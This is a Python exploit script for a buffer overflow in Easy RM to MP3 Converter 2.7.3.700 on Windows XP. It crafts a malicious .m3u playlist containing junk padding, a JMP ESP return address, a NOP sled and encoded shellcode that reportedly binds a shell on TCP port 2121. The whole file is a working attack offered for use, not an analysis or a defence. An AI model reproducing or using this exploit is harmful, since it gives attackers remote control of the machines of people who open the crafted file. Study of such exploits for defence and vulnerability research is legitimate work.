!/usr/bin/pyhton
# Easy RM to MP3 Converter 2.7.3.700 (.m3u) File WinXP Sp2 Buffer Overflow Exploit
# Author: Vivian Mungai
# Download :  http://www.rm-to-mp3.net/EasyRMtoMP3Converter.exe
# Tested : Windows XP (En)

header="#EXTM#U\r\n"
line1="#EXTINF: 191, Artist Name -Song Title\r\n"
url_part1="https://"

# 26104 bytes are needed before overwriting EIP register
junk1 = "A"* 26104

# JMP ESP in iertutil.dll
eip = "\x57\x89\x08\x3E"

junk2 = "\x43" * 100

#padding

nops="\x90"*16

# Bind a shell at TCP Port 2121

buf =  ""
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x74\x7b\x87\xdd\x83\xee\xfc\xe2\xf4\x88\x93"
buf += "\x05\xdd\x74\x7b\xe7\x54\x91\x4a\x47\xb9\xff\x2b\xb7"
buf += "\x56\x26\x77\x0c\x8f\x60\xf0\xf5\xf5\x7b\xcc\xcd\xfb"
buf += "\x45\x84\x2b\xe1\x15\x07\x85\xf1\x54\xba\x48\xd0\x75"
buf += "\xbc\x65\x2f\x26\x2c\x0c\x8f\x64\xf0\xcd\xe1\xff\x37"
buf += "\x96\xa5\x97\x33\x86\x0c\x25\xf0\xde\xfd\x75\xa8\x0c"
buf += "\x94\x6c\x98\xbd\x94\xff\x4f\x0c\xdc\xa2\x4a\x78\x71"
buf += "\xb5\xb4\x8a\xdc\xb3\x43\x67\xa8\x82\x78\xfa\x25\x4f"
buf += "\x06\xa3\xa8\x90\x23\x0c\x85\x50\x7a\x54\xbb\xff\x77"
buf += "\xcc\x56\x2c\x67\x86\x0e\xff\x7f\x0c\xdc\xa4\xf2\xc3"
buf += "\xf9\x50\x20\xdc\xbc\x2d\x21\xd6\x22\x94\x24\xd8\x87"
buf += "\xff\x69\x6c\x50\x29\x13\xb4\xef\x74\x7b\xef\xaa\x07"
buf += "\x49\xd8\x89\x1c\x37\xf0\xfb\x73\x84\x52\x65\xe4\x7a"
buf += "\x87\xdd\x5d\xbf\xd3\x8d\x1c\x52\x07\xb6\x74\x84\x52"
buf += "\xb7\x7c\x22\xd7\x3f\x89\x3b\xd7\x9d\x24\x13\x6d\xd2"
buf += "\xab\x9b\x78\x08\xe3\x13\x85\xdd\x7c\x32\x0e\x3b\x1e"
buf += "\x6b\xd1\x8a\x1c\xb9\x5c\xea\x13\x84\x52\x8a\x1c\xcc"
buf += "\x6e\xe5\x8b\x84\x52\x8a\x1c\x0f\x6b\xe6\x95\x84\x52"
buf += "\x8a\xe3\x13\xf2\xb3\x39\x1a\x78\x08\x1c\x18\xea\xb9"
buf += "\x74\xf2\x64\x8a\x23\x2c\xb6\x2b\x1e\x69\xde\x8b\x96"
buf += "\x86\xe1\x1a\x30\x5f\xbb\xdc\x75\xf6\xc3\xf9\x64\xbd"
buf += "\x87\x99\x20\x2b\xd1\x8b\x22\x3d\xd1\x93\x22\x2d\xd4"
buf += "\x8b\x1c\x02\x4b\xe2\xf2\x84\x52\x54\x94\x35\xd1\x9b"
buf += "\x8b\x4b\xef\xd5\xf3\x66\xe7\x22\xa1\xc0\x77\x68\xd6"
buf += "\x2d\xef\x7b\xe1\xc6\x1a\x22\xa1\x47\x81\xa1\x7e\xfb"
buf += "\x7c\x3d\x01\x7e\x3c\x9a\x67\x09\xe8\xb7\x74\x28\x78"
buf += "\x08"
# Creating the malicious data	
payload = junk1 + eip + junk2 + nops + buf
url_part2=".example.com/Mine.mp3"
exploit=open("C:\FinalExploit\mp3.m3u","w")
exploit.write(header + line1 + url_part1 + payload + url_part2)

